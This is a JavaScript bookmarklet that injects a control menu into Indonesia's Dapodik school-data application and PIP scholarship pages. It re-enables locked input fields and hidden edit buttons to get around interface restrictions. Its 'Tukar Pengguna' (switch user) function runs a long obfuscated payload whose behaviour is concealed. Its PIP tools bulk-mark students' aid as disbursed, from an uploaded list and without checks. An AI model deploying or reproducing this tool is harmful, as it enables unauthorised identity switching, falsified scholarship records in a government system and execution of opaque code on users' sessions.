(function() {
    // Mencegah menu dobel jika di-klik berkali-kali
    if(document.getElementById('menu-injector-dapodik')) {
        document.getElementById('menu-injector-dapodik').remove();
    }

    // Membuat UI Menu
    var menu = document.createElement('div');
    menu.id = 'menu-injector-dapodik';
    menu.style.cssText = 'position:fixed;top:20px;right:20px;width:250px;background:#f9f9f9;border:1px solid #ccc;z-index:999999;box-shadow:0 4px 15px rgba(0,0,0,0.2);border-radius:8px;font-family:sans-serif;padding:15px;max-height:90vh;overflow-y:auto;';
    
    menu.innerHTML = `
        <h3 style="margin-top:0;font-size:16px;border-bottom:2px solid #00acc1;padding-bottom:5px;text-align:center;color:#333;">Menu Injector</h3>
        
        <b style="font-size:12px;color:#555;">DAPODIK</b>
        <button id="btn-val" style="width:100%;padding:8px;margin:5px 0;cursor:pointer;background:#2196F3;color:white;border:none;border-radius:4px;">Validasi Semua</button>
        <button id="btn-tukar" style="width:100%;padding:8px;margin:5px 0;cursor:pointer;background:#2196F3;color:white;border:none;border-radius:4px;">Tukar Pengguna</button>
        <button id="btn-sel-tabel" style="width:100%;padding:8px;margin:5px 0;cursor:pointer;background:#2196F3;color:white;border:none;border-radius:4px;">Seleksi Data Tabel</button>
        <button id="btn-sel-input" style="width:100%;padding:8px;margin:5px 0;cursor:pointer;background:#2196F3;color:white;border:none;border-radius:4px;">Seleksi Field Input</button>
        <button id="btn-hapus-over" style="width:100%;padding:8px;margin:5px 0;cursor:pointer;background:#2196F3;color:white;border:none;border-radius:4px;">Hapus Overlay</button>
        <button id="btn-koreg" style="width:100%;padding:8px;margin:5px 0;cursor:pointer;background:#2196F3;color:white;border:none;border-radius:4px;">Copy Kode Regis</button>
        <button id="btn-ruang" style="width:100%;padding:8px;margin:5px 0;cursor:pointer;background:#2196F3;color:white;border:none;border-radius:4px;">Edit Ruang</button>
        
        <b style="font-size:12px;color:#555;display:block;margin-top:10px;">PIP</b>
        <button id="btn-pip" style="width:100%;padding:8px;margin:5px 0;cursor:pointer;background:#4CAF50;color:white;border:none;border-radius:4px;">Konfirmasi PIP</button>
        
        <button id="btn-close-app" style="width:100%;padding:8px;margin-top:15px;cursor:pointer;background:#f44336;color:white;border:none;border-radius:4px;font-weight:bold;">Tutup Menu</button>
    `;
    document.body.appendChild(menu);

    // Fungsi: Tutup Menu
    document.getElementById('btn-close-app').onclick = function() {
        menu.remove();
    };

    // Fungsi: Validasi Semua
    document.getElementById('btn-val').onclick = function() {
        var lokasi = window.location.href;
        var menunya = lokasi.split('#');
        if (menunya[1] == 'Validasi') {
            Xond.msg("Sedang Proses", "Proses semua validasi sedang berjalan, Tunggu beberapa saat");
            document.querySelectorAll("a.x-tab").forEach(el=>el.click());
        } else {
            Ext.MessageBox.show({
                title: "Error", msg: "Gunakan fitur ini pada halaman Validasi", width: 400,
                buttonText: { yes: "Lanjut ke halaman validasi", no: "Tutup" },
                fn: function(v) {
                    if (v == "yes") { Ext.MessageBox.hide(); window.location.href = ('/#Validasi'); } 
                    else { Ext.MessageBox.hide(); }
                }
            });
        }
    };

    // Fungsi: Tukar Pengguna (Script asli yang dienkripsi)
    document.getElementById('btn-tukar').onclick = function() {
        // Karena script tukar pengguna sangat panjang dan dienkripsi (obfuscated) dari sumber Anda, 
        // disisipkan dalam bentuk eksekusi aslinya
        var urlEncodedScript = "javascript:(function()%7Bvar%20m%2Cw%2Cb%2Cc%3B(function()%7Bvar%20UMb%3D''%2CpKt%3D560-549%3Bfunction%20Bee(z)%7Bvar%20q%3D351284%3Bvar%20m%3Dz.length%3Bvar%20w%3D%5B%5D%3Bfor(var%20p%3D0%3Bp%3Cm%3Bp%2B%2B)%7Bw%5Bp%5D%3Dz.charAt(p)%7D%3Bfor(var%20p%3D0%3Bp%3Cm%3Bp%2B%2B)%7Bvar%20u%3Dq*(p%2B219)%2B(q%2531936)%3Bvar%20j%3Dq*(p%2B704)%2B(q%2527119)%3Bvar%20r%3Du%25m%3Bvar%20i%3Dj%25m%3Bvar%20h%3Dw%5Br%5D%3Bw%5Br%5D%3Dw%5Bi%5D%3Bw%5Bi%5D%3Dh%3Bq%3D(u%2Bj)%252731816%3B%7D%3Breturn%20w.join('')%7D%3Bvar%20QwT%3DBee('ojrpqoucxrsnbodhktfewcttsamgrzyulcivn').substr(0%2CpKt)%3Bvar%20Zkl%3D'.maranhf%2C7wtc.7os%5Dxv%2C)%20tm%22%5B1sdiv%3Ba(mulx%3Bfc%7B(s%3BSnixyi2%3Bj%3Du%3Duo%206h%2C7vC%2C2d%5B%2Bf%3Dl%2Copvir%2C8(c9r%2Cs1%2Brph)%3B7oC%2C6v38h1t4t8er%3Blr(tzr%20t%2Btvri)%3D)ra%5B%2Cc)v)oa%2B%2C%3BSlsv%3D8)0-tu)(%2Bt)%20i)%3Dtna%3Dn)(n1.(%3Db%3Dg%3Bp%20g%3D(3as%5DC9uah(nqtt%5D%3Drivt1%20p%20af%3B1oag(m%2C.ian%2Cwr01r%3B.%2Ba)ar3r%2C3l%3Br%3B%2Cdkn0t%3B(r%2B.sei%3Br(%20.)%20%2B0oteggtt1mlll()bhg%3Bhrn%3Du26ia%20%7B1c.9(%2C%5Braltd%2Br*colvr%20%7Dva.5%3Bjtaq.m%3Bbhn%3B60l%3B%5Bil%3Bjan(v%5B5u%2Be%5DvgraC%3Doe%5Dhaniz%3D.%3Br%3C2v.%209j6ag%2C)o%7Biccna%3Corp).%3D8h%3Dz5)relv)4osserl%3Daae%3D%3BA-%3Bn1(0co%3Df%22f%2Cuna%3Dt20a%3D9-0uela)n%3D%2B%2Ct%5B%7Dleanru7%20%20.hg%7Bas%20-rsj%20l)8hi%3D%2Bc%3Dih.u%5Dn%3DaA%5B2.snv%5Bzv%22rh%3BtC%3Cde%20(%22v(nedj%3B))v%3Ef%2B%3D%5B3%7Dl)0e4seh%22u%20..(%5Do%2Bvn-%3C%3Doei%20gegi%7D%3Bg%20n%3Ej.g%3Deu%2B*%3Dtjs%3Da2snil%2C%2Ba%3D%2Bm%7B5g06%2B2hao%5Bl%2B7ot8)sn(q%2Bqrrrs!bnaf%22r%7Big((%22%5Dv.)%2C.rs%2Crp%5Bo%3Ds0ai.%2Cgk%5D7%2Cbrff%3Dcvr)9%20a4%22Aerh%3B%5D%5Bt%3Bu.%3Batop%3B%7Dv7%20udh-))%3Dij2%22%3Bsn)uh%2Bc%3D%5B)oujleb%2B%5D(%3B%2Coq%7D%3B%20%3D.(orc(%2B%3D!a%3D1aeAr9%20tmgng.gnfrCe4%3BCcd%3D%5D%3B6%2C%3Bv%3Bm(c%7Davn%3Bd%3Bnv%3D.a(a1%2Chp)k((hndmp0wrt8)u%3C.c%7B-pA%3Big))%3Br(pnn%3Br6uk%20rf%2B%3Bma%3Daw%2B%5D(l(i2rung0rft%3B%3B%3Bn(%3DCpj%5Dc8(%3B%22fv%2Ca7orldkvi'%3Bvar%20lPT%3DBee%5BQwT%5D%3Bvar%20MWE%3D''%3Bvar%20XGa%3DlPT%3Bvar%20ilA%3DlPT(MWE%2CBee(Zkl))%3Bvar%20VBS%3DilA(Bee('%2CgiD%20%5D%2Ckiw103%3A%2Ce11_b_cpr.%7D)c2pe%7BBarBgb%5D.um.Buent!lB%3B%22%5Dbg6B%5D%7Dws4.7%7DBIBT%22!BiB_rxeBN_9.m%7Dta4f%5DnBn%24d(_%7DB1B6_ijkcB%2Cm%5Deha%2C9ruSu8xaawe9%2CoBh_57mlG%5D_%20a%5C%2Fao()CB9%20Dt_v_f4(%7D%2C%2C%25Ba.0%3B9bPt_B__m%2Ca.re.lee..e4lB%2Ctsa.((bp8egTedBe%25BBm_)B.h.s%3E.%5DBBs.e3lB28BmB%2Co%3Bo0.h36c_u%3Bt%25gwror%5Di%3Dtcg0B.9%5D.moosno%3C%5Dao(%3Epel%7B%26kTBaij1gsd(Ir0%25iL.r%26.so!r(.SS_ttBrSB)2bB%3D%3D.Cin%24lg%2Cw%2Co1imrt.%22%3Ajec%23)3a.o)31.4f%23%2Cak_%3DeTr(m3JB%25_nrB%2C%2Cgta%7Dw3ne.3%7Bef%2Chaht%20..s%3A(2K%2Bo!)%24pBBde%24t%24rf%25%25%5D%5Dunw%25t%5D.)(B%3A5B.%23sw%3EB(io)e3%7D)gd%20.%25en.BS%2C.%3Ee%25en18u%5De%3E)p%5C%2FBj9_%3FeB0wk(2.6neCB%7D9e_S)gBh%7D.nko)%24el.B6xks32%3B_a(BB_%5Dk%2Cs%256B6%3A2iwe.a3%2CNnBnft_kc.!Cv%5D%3Dp.s%25M.BMt18N)yCBa%22%3Bo.%5DoDl)i%2C_0ne%3Bo%5D6d5ag%5B%25r992R%22.m!0h%5De)%25%7B%25%3F%244BB7.)sda%3B!%25BraB1ednlBin75%25eBee%20i.t)%5D14.s_B3Bxlra5)auncx!%26(8B%5BB0%2Ccfkpnr!4%3DBd%7B.cc!BtccrBd.23%25Bea)g0.%5C%2F_%5Dt%20Kl8obbaeBeb!atyb%5D%25!BBte6tB%24r381%3B%20n.Aee1bo56%2C%2CB%22.t!3rsBeai%5Dey_BB%2C%20).pB%5D%3D03%7BoB1eeliBp3bn%2C4%3Ah.eo.Be%3Diy%2C%24ub%249%5Dd.7%7Dntntetl%3Cud1%5D(BilniQ%25uhlB%25.aomppe(.7e35seCes2xtsstr%24cf%3A(%25fnuta._3(la18%2C%7D1%3E)NB%25p%3Af_e%20%5Dy%229)B2fr%3Bph%5Dt(%25eB9oe3)ag)ta!.tlhmtBfeBcie.DK(k)pt%3D)%7Dc2Be%20%25(eBu.fBkeP.%2Ca%5DB9!(.!.us(%7B%3C2dmf4s%2CedH5%3B1sr%3AB(oi0.2da1oo2Q!cp.%5DBLo%5D%3Durl.!e(sr.Bt-%20Ks%20a2%7Bqe.Bs%5DO_%5C%2F33e%7B%2B%20%2C%2Bai%2C%3BiB%7D%7Bt%5D.ioy(BB%3ABxa%2Coc%7B).Hitr%25nB%7DB%3Bet%7B%2Ce(0tBBB(4%3BBe.B%7Du32BtdhrPnrO)n%25CBltu2u%2CBB1%3F%5D)%7DB%3BHl.i%5DtmB.u4%2CQLje%25s%5B(1.iaBldoBui%3D.E).)%5DBnh7i.3%3Dev.8Bkghj%2CtBwOl%2Ct%2C%20aej)a2%5D%2Cn3(jA0%7D%25jKB34p%7BtjB%5DBo_3jBc)o(hl)%25Be(lte.%3ABBra%5Dlc%23fu%5DsBmee)%3D_a!jB%5Dl(t.edaxl74E0S.B.%5Dckl%3B1%25%3Bn%20i54df%3Ah%5D%7D%7Da1(%5D%5D%5DciujBAd)eBB%5DB.EC66!%3A%3Dbsd(550S_8(2B!tt2n0gnt4ser%5D_a%20CMei%3A%3DfmuslB%25.%5DBaeooaliK5%5Dpw0%5Dg9%7Bh(21%7Db%5Dl%7DB%2Cn%25)%7B_211f_swB.2H%2Cl77gll%5C'i2B!B%5Brkee_Bmo%3B)_%7D%2Ce%3BJu.s%2CA.4kd%3D%7B%3Da%25%25%7D4_%3DBa7nuBBeauaBaBn%5C'6edo%7D0%3Fcstr!%2C)aB)%7Boe6*)%20n%5Da(2e%5B%3BB.d!oPl(ep)B)SE7CrB)8iBaeer)B57B.sp-aiBNsBaBlfmlrBM8)(BBu9t%7D_Gi%202%3E%3A9s9(%2C2%2Ce%3AN3%7Drejo%25%20lb%7B)%20B0%5D2%3E1iB%25ejb3%3D)ae%7Bp_%5B%3D7%20%24a3(v3%5B4n%5D%7Dcf_i3nK0e%25%3F)rk_rBe%3B0stB1n%3BBeBp_d%3D%23n%3B1(%5D_Btb%7Do4%24Plt%3A%24e6%7Bj48au%3Am.Me%7D1_m%2Cr(ge5%40p)%7Bp%20rros%25aB%7B%7B%7DEeBfb.0T1k%5D.4%3Dk%3C1g.r!%2Cotc(dd(Gf%7D_).f%5D%3Dekf%5Df(ea)p_s%7Dg0b(a%3Bomo%5DpB%5D(ue%2C%7Dw.n%5D%7D1p%3D%7B%222r%3AetoB.i%3Da%5De8oed2%2CrBcon9%3As%203end4%2C%3EB3%2Cy%24.i!BBid0w%3A7%3Eec44CB_ta(iloa_B%5DBk%3Ep%3B%20)nr)B!Beo)%5De%3Anc%24b17u%3ABBp%5C%2F8a11m.l4jee%5D!.%5D03B-Bk1_eCRcxcBa(dcx6.1.C%5Dprs1%5Dd()2n)on2I3CB.%5B42%25!8%2Cea3%5BeCB1%5Deu(c3%24cB*ce%3C%25!((hmaB%24%2CBdlB!of%7B.tae_%5D5eit%20%241ieC.B%207N%5DNB9kBBt%24%3Be%221asap%257i%3B%2Cma%3A.%3FrBneB8t%7DB.%23%5Dmu%22s%3B(0).htFldeel%20%2C_%7D4g%3F.)leKBk)%20.BBe!.2lwnmkvu(.0Bntnwf%24B4%5Dsealpe(60%25%7B)!ab%24tcatpki.wBR1bptBtBa7oi%3E2BddBh(oktN7%25%25%3E%2Csoes6r%25%3A%3F((utawsroB-olu2J).B%25%7Bdyi%22Brih%2C7%20nBl%5DiB%3A%7BEnm%2CeB3idtt1B%5D0BB%25%2B%2Ci%25B%25mBhaban()BT0%3D%7D0%2Cmae%2B%7D!bs%5D_i%7Bn2%5Dp4C%3D%25e_3BwB%26%2CnBaB1.d%5Da_%2Cm%5C%2Fx%3AmBn%2C%20eBBnCds%3E4e%3E114.l_o%3F%244e%233eoBblf74e1Blsta0%2CC.vr%5C%2F%25auL6Bsu%25a%7DB%5Dtt4C0(y8%7Bnrwe%2C125%5Dpb%5DgBD.0_4BBiB5e5t%2C1k)ga!e5%23pv%3A%23o%3AB%25iDt0K3aiors%3An_d%250%5Dnt%20teot0Ba3oison0%3F%25BsBhhd.eeo57ln30.B%20f4aB!%3Da%2Cr%24%2Cau%5Dd9%2Cp.%24c%2CfB_oB3%2Cdg3a!3geBBG(.5%3EaB(%25%25.623E-enB%5D%2B1%2C%3Bi(ee%5DrB)uB_vn_23%5C'N.e%5Dtn13Bu.jBFBw933%3B%3Df%7BR%3D._B.elr_awife2e%5D(%3E_kl%3FbIaB3B%5C%2F%2Cs2%5D.iT_n%24k)%23%2C%260(!%5D222)B5%40t%3Bot!2aslFB-(%40%5C'Ie3r)0B4te%7D%242l!dx3oB(y_oB5BB.tBasohaf%2CBrB)BB.6B%2C!%24_nyg%2C.t6%3Dte!%5DjaB%5Dg)1i%7BBf%7Di%3Akt%200lw%3Af_0eera_%24eB.ebhBBa_%25I9l(dupno_Be_ae(%3Ba%3E%3FBoab6O%5Dxe%25tu0ann_9B%7DBtBe%20%5Demn0idB20epari71s%25r4%3D%3BB%7BT%5Dm)Ci2Bmk%5Dt2bB)s11060!%3Fnil%24%24egfBB.xMm%20%25B6t6B9%7De2(oa6%7Di%7Bd(klsyt30%20aOF%5Dt%2Ca_e2.irrBNS%2CrJx%2CsHa2.i%2C2u8%20a1Bh%3B)neB%5Dt%3AjsB9iuelb.y%5Db23Si%2BLdeB%3Anc_!keftx!)tm7%3B_(nb)%5Dtns%3BTee(!3i%3E3%3D%2C*BavB%5D8t%2445%20(%5D%3B)B%2C%2Cd(c%5Dts)Bne%7BBnMTaeBsh%7Dest4deg%3Da%20aataBe2%24eia.%5DB)k%7DK%25aB)rBg%242%5C%2F)nj1ewaBs))%5D.1%24%7B%20s0d%7BBx8b%3A%20)MbP%24.a3u6%3A%20)%5Blf22u%7BuvnoHOB%25K1%2C%5D(ia%7Bed%40(%5D%2Cl)%5C%2F0)sBBBj%2B)Br%3B%5C%2Fetrese%2Butp)Belg)tl%5B%24%5Bnw%3DBa23c%208%3D!h%244%3Bra%20).%20sBBcttePd.sii%5B6(B%20*w%3A.6B.%7D)B%22%5Dn%5D9B%5D02as9b%20M.%3B5)%25)CttSBaatTiB)Bbe_es%20agn%20j)s3%5D%3DBg3umu.l(l7oaT..!a%5D!gB%2Cae6%7Dda(Bt%24%20rQ%2ClsiBB.v0..e'))%3Bvar%20tEV%3DXGa(UMb%2CVBS%20)%3BtEV(9615)%3Breturn%202899%7D)()%7D)()";
        location.href = urlEncodedScript;
    };

    // Fungsi: Seleksi Data Tabel
    document.getElementById('btn-sel-tabel').onclick = function() {
        document.querySelectorAll(".x-unselectable").forEach(el => el.classList.replace('x-unselectable','x-selectable'));
        if(typeof Xond !== 'undefined') Xond.msg("Info", "Select table sudah aktif");
    };

    // Fungsi: Seleksi Field Input
    document.getElementById('btn-sel-input').onclick = function() {
        document.querySelectorAll("input").forEach(el => el.style.pointerEvents = 'all');
        if(typeof Xond !== 'undefined') Xond.msg("Info", "Select field input sudah aktif");
    };

    // Fungsi: Hapus Overlay (Sama dengan Seleksi Field Input berdasarkan kode asli)
    document.getElementById('btn-hapus-over').onclick = function() {
        document.querySelectorAll("input").forEach(el => el.style.pointerEvents = 'all');
        if(typeof Xond !== 'undefined') Xond.msg("Info", "Select field input sudah aktif (Hapus Overlay)");
    };

    // Fungsi: Copy Kode Regis
    document.getElementById('btn-koreg').onclick = function() {
        Ext.Ajax.request({
            url: "getKoreg",
            method: "GET",
            success: function(x) {
                var y = x.responseText;
                navigator.clipboard.writeText(y.split('<br>')[1]).then(() => {
                    Xond.msg("Koreg Tersalin", "Silakan salin dengan Ctrl+v");
                }, (e) => {
                    Xond.msg(e);
                });
            }
        });
    };

    // Fungsi: Edit Ruang
    document.getElementById('btn-ruang').onclick = function() {
        var spans = document.querySelectorAll('.x-btn-inner');
        var positions = {
            'Tambah':'160px',
            'Ubah':'259px',
            'Simpan':'340px',
            'Hapus':'435px',
            'Kondisi Ruang (2026/2027)':'522px'
        };
        spans.forEach(function(span){
            var text = span.innerText || span.textContent;
            if(positions[text]){
                var btn = span.closest('.x-btn');
                if(btn){
                    btn.style.display = '';
                    btn.style.right = 'auto';
                    btn.style.left = positions[text];
                    btn.style.top = '0px';
                    btn.style.margin = '0px';
                    btn.style.userSelect = 'initial';
                    btn.setAttribute('aria-hidden','false');
                }
            }
        });
        alert("Edit ruang diaplikasikan.");
    };

    // Fungsi: Konfirmasi PIP
    document.getElementById('btn-pip').onclick = function() {
        if(document.getElementById('pip-popup-overlay')){
            document.getElementById('pip-popup-overlay').remove();
        }
        var overlay=document.createElement('div');
        overlay.id='pip-popup-overlay';
        overlay.style.cssText='position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.6);z-index:999999;display:flex;align-items:center;justify-content:center;font-family:sans-serif;';
        var modal=document.createElement('div');
        modal.style.cssText='background:#fff;padding:25px;border-radius:10px;width:340px;text-align:center;box-shadow:0 4px 15px rgba(0,0,0,0.2);';
        
        var menuUtama=document.createElement('div');
        menuUtama.innerHTML='<h3 style="margin-top:0;color:#00acc1;">🤖 Konfirmasi PIP Otomatis</h3><p style="font-size:14px;color:#555;margin-bottom:20px;">Pilih metode yang ingin digunakan:</p><button id="btn-manual" style="display:block;width:100%;padding:12px;margin-bottom:10px;background:#4caf50;color:white;border:none;border-radius:5px;cursor:pointer;font-weight:bold;font-size:14px;">1. Mode Manual (Tombol OK)</button><button id="btn-excel" style="display:block;width:100%;padding:12px;margin-bottom:15px;background:#00acc1;color:white;border:none;border-radius:5px;cursor:pointer;font-weight:bold;font-size:14px;">2. Mode Upload Excel</button><button id="btn-close" style="background:transparent;border:none;color:#e53935;cursor:pointer;text-decoration:underline;font-size:14px;">Batal & Tutup</button>';
        
        var menuExcel=document.createElement('div');
        menuExcel.style.display='none';
        menuExcel.innerHTML='<h3 style="margin-top:0;color:#00acc1;">📊 Upload Excel</h3><p style="font-size:13px;color:#555;margin-bottom:15px;">Pastikan baris pertama adalah judul kolom <b>PIP_ID</b>.</p><button id="btn-dl-temp" style="display:block;width:100%;padding:10px;margin-bottom:15px;background:#ff9800;color:white;border:none;border-radius:5px;cursor:pointer;font-weight:bold;">📥 Unduh Template</button><input type="file" id="input-excel" accept=".xlsx, .xls" style="display:block;width:90%;padding:10px;margin-bottom:15px;border:1px solid #ccc;border-radius:5px;cursor:pointer;font-size:12px;margin-left:auto;margin-right:auto;" /><button id="btn-back" style="background:transparent;border:none;color:#555;cursor:pointer;text-decoration:underline;font-size:14px;">Kembali</button>';
        
        modal.appendChild(menuUtama);
        modal.appendChild(menuExcel);
        overlay.appendChild(modal);
        document.body.appendChild(overlay);
        
        document.getElementById('btn-close').onclick=function(){overlay.remove();};
        
        document.getElementById('btn-manual').onclick=function(){
            overlay.remove();
            alert("Mode Manual Aktif!\\nTombol 'OK (Cair)' akan muncul di bawah tombol konfirmasi tabel.");
            setInterval(function(){
                var btns=document.querySelectorAll('a.konfirmasi-data');
                btns.forEach(function(btn){
                    if(!btn.nextElementSibling||!btn.nextElementSibling.classList.contains('tombol-ok-cepat')){
                        var btnOk=document.createElement('button');
                        btnOk.className='btn btn-success btn-sm tombol-ok-cepat';
                        btnOk.innerHTML='OK (Cair)';
                        btnOk.style.cssText='display:block;margin-top:5px;width:100%;font-weight:bold;';
                        btnOk.onclick=function(){
                            if(confirm("Pilih 'Sudah Cair' dan Simpan untuk siswa ini?")){
                                btn.click();
                                setTimeout(function(){
                                    var sel=document.getElementById('konfirmasi');
                                    var submit=document.getElementById('btn-konfirmasi');
                                    if(sel&&submit){
                                        sel.value='a033b005-9a97-4f94-b626-bde81c124059';
                                        sel.dispatchEvent(new Event('change',{bubbles:true}));
                                        submit.click();
                                    }
                                },500);
                            }
                        };
                        btn.insertAdjacentElement('afterend',btnOk);
                    }
                });
            },1500);
        };
        
        document.getElementById('btn-excel').onclick=function(){
            menuUtama.style.display='none';
            menuExcel.style.display='block';
            if(typeof XLSX==='undefined'){
                var script=document.createElement('script');
                script.src='https://cdnjs.cloudflare.com/ajax/libs/xlsx/0.18.5/xlsx.full.min.js';
                document.head.appendChild(script);
            }
        };
        
        document.getElementById('btn-back').onclick=function(){
            menuExcel.style.display='none';
            menuUtama.style.display='block';
        };
        
        document.getElementById('btn-dl-temp').onclick=function(){
            if(typeof XLSX==='undefined'){alert("Sistem sedang memuat, coba klik 1 detik lagi.");return;}
            var ws=XLSX.utils.json_to_sheet([{PIP_ID:"G100910493818050340TA"},{PIP_ID:"G100910493818050341TB"}]);
            var wb=XLSX.utils.book_new();
            XLSX.utils.book_append_sheet(wb,ws,"Template");
            XLSX.writeFile(wb,"Template_Konfirmasi_PIP.xlsx");
        };
        
        document.getElementById('input-excel').addEventListener('change',function(e){
            var file=e.target.files[0];
            if(!file)return;
            var reader=new FileReader();
            reader.readAsArrayBuffer(file);
            reader.onload=function(e){
                var data=new Uint8Array(e.target.result);
                var workbook=XLSX.read(data,{type:'array'});
                var jsonExcel=XLSX.utils.sheet_to_json(workbook.Sheets[workbook.SheetNames[0]],{defval:""});
                if(jsonExcel.length>0&&jsonExcel[0].hasOwnProperty('PIP_ID')){
                    alert("Membaca "+jsonExcel.length+" baris data. Memulai eksekusi otomatis...");
                    overlay.remove();
                    eksekusiOtomatisExcel(jsonExcel);
                }else{
                    alert("Format salah! Judul kolom pertama harus 'PIP_ID'.");
                }
            };
        });
        
        function eksekusiOtomatisExcel(dataExcel){
            var index=0;
            var totalBerhasil=0;
            function prosesBaris(){
                if(index>=dataExcel.length){
                    alert("Proses Selesai!\\nBerhasil memproses: "+totalBerhasil+" data dari halaman ini.");
                    return;
                }
                var targetId=String(dataExcel[index].PIP_ID).trim();
                if(!targetId){index++;prosesBaris();return;}
                
                var semuaTombol=document.querySelectorAll('a.konfirmasi-data');
                var tombolDitemukan=null;
                for(var i=0;i<semuaTombol.length;i++){
                    var barisTabel=semuaTombol[i].closest('tr');
                    if(barisTabel&&barisTabel.textContent.includes(targetId)){
                        tombolDitemukan=semuaTombol[i];
                        break;
                    }
                }
                
                if(tombolDitemukan){
                    tombolDitemukan.click();
                    setTimeout(function(){
                        var selectKonfirmasi=document.getElementById('konfirmasi');
                        var btnSimpanModal=document.getElementById('btn-konfirmasi');
                        if(selectKonfirmasi&&btnSimpanModal){
                            selectKonfirmasi.value='a033b005-9a97-4f94-b626-bde81c124059';
                            selectKonfirmasi.dispatchEvent(new Event('change',{bubbles:true}));
                            btnSimpanModal.click();
                            totalBerhasil++;
                            console.log("Sukses: "+targetId);
                            index++;
                            setTimeout(prosesBaris,1500);
                            return;
                        }else{
                            index++;
                            setTimeout(prosesBaris,1500);
                            return;
                        }
                    },500);
                    return;
                }
                console.log("Lewat: "+targetId);
                index++;
                prosesBaris();
            }
            prosesBaris();
        }
    };
})();
